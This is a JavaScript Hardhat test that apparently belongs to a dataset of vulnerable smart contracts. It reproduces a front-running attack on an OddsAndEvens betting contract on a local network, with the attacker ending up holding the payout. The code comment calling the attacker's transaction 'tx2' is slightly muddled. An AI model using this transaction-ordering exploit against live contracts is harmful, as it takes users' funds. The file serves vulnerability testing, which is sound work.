const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');
const path = require("path");
const fs = require("fs");

describe('attack front_running/odds_and_evens.sol', function () {
    let owner, user, attacker;
    async function deployContracts() {
      [owner, user, attacker] = await ethers.getSigners();
      const codePath = path.join(__dirname, '../../artifacts/contracts/dataset/front_running/odds_and_evens.sol/OddsAndEvens.json');
      const json = JSON.parse(fs.readFileSync(codePath));
      const OddsAndEvens = await ethers.getContractFactory(json.abi, json.bytecode);
      const victim = await OddsAndEvens.connect(owner).deploy();  
      return {victim};
    }


    it('front running vulnerability', async function () {
      const {victim} = await loadFixture(deployContracts);

      const amount = ethers.parseEther("1");

      const attackerBalanceBefore = await ethers.provider.getBalance(attacker.address);
      const userBalanceBefore = await ethers.provider.getBalance(user.address);
      
      const initialBalance = await ethers.provider.getBalance(victim.target);
      expect(initialBalance).to.be.equal(0);

      await network.provider.send("evm_setAutomine", [false]);
      await network.provider.send("evm_setIntervalMining", [0]);
      const tx1 = await victim.connect(user).play(0, {value: amount, gasPrice: 767532034});

      // attacker sees tx2 and sets the value and gasPrice to become the winner
      const tx2 = await victim.connect(attacker).play(1, {value: amount, gasPrice: 767532033});

      await network.provider.send("hardhat_mine", ["0x3"]);
      await network.provider.send("evm_setAutomine", [true]);

      const receipt1 = await tx1.wait();
      const gasUsed1 = receipt1.gasUsed * receipt1.gasPrice;
      const receipt2 = await tx2.wait();
      const gasUsed2 = receipt2.gasUsed * receipt2.gasPrice;
      const balanceAfter = await ethers.provider.getBalance(victim.target);
      expect(balanceAfter).to.be.equal(amount * BigInt(2) - ethers.parseEther("1.8"));

      const userBalanceAfter = await ethers.provider.getBalance(user.address);
      expect(userBalanceAfter).to.be.equal(userBalanceBefore - amount - gasUsed1);

      const attackerBalance = await ethers.provider.getBalance(attacker.address);
      expect(attackerBalance).to.be.equal(attackerBalanceBefore - amount - gasUsed2 + ethers.parseEther("1.8"));
    });


  });